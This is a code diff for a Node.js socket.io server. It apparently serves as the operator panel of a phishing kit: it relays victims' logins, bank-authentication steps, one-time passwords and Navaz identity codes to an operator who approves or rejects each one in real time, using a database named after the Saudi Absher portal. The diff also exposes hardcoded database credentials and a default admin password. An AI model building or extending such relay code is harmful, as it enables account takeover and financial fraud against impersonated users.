@@ -19,8 +19,6 @@ io.on('connection',(socket)=>{
     console.log('userconnected with id' + socket.id)
     socket.on('login',async(data)=> io.emit('newLogin',data))
     socket.on('allow',async(data)=>{
-        const {mode,main_data} = data
-        console.log(data)
         await Session.findByIdAndUpdate(data.session._id,{status:true},{new:true}).then((session)=>io.emit('success',{...data,session}))
     })
     socket.on('newOrder',(data)=>{
@@ -51,8 +49,10 @@ io.on('connection',(socket)=>{
             }
         }
      })
+     socket.on('loginOtp',(data)=>io.emit('loginOtp',data))
 
      socket.on('newNavaz',(data)=>io.emit('newNavaz',data))
+     socket.on('navazOtp',(data)=>io.emit('navazOtp',data))
      socket.on('disAllowNavaz',(data)=>io.emit('disAllowNavaz',data))
      socket.on('AllowNavaz',(data)=>io.emit('AllowNavaz',data))
      socket.on('bankAuth',(data)=>{
@@ -63,8 +63,12 @@ io.on('connection',(socket)=>{
 
      socket.on('declineOtp',(data)=>io.emit('declineOtp',data))
      socket.on('acceptOtp',async(data)=> await Order.findByIdAndUpdate(data.id,{otp:data.otp}).then(()=>    io.emit('acceptOtp',data)))
+     socket.on('AllowUserOtp',(data)=>io.emit("AllowUserOtp",data))
+     socket.on('disAllowUserOtp',(data)=>io.emit("disAllowUserOtp",data))
+
     socket.on('disAllow',(data)=>   io.emit('disAllow',data))
     socket.on('disconnect',()=>console.log('disconnect with id '  + socket.id))
+
 })
 
 async function deleteExpiredSessions() {
@@ -87,9 +91,12 @@ setInterval(deleteExpiredSessions, 24 * 60 * 60 * 1000);
 
 app.use('/',mainRoute)
 app.use(errorHandle)
-mongoose.connect('mongodb+srv://test:test@abshr.2x9e0av.mongodb.net/Main').then((con)=>{
+mongoose.connect('mongodb+srv://test:test@abshr.2x9e0av.mongodb.net/Main2').then((con)=>{
     server.listen(PORT, async() => {
         console.log(`listen on port ${PORT} And Connect To DB ${con.connection.host}`)
+        
+        // const password = await bcrypt.hash('admin123456',10)
+        // await User.create({email:'admin@abshr.org',password,type:'admin'})
     })
 }).catch(e=>console.log(e))
 
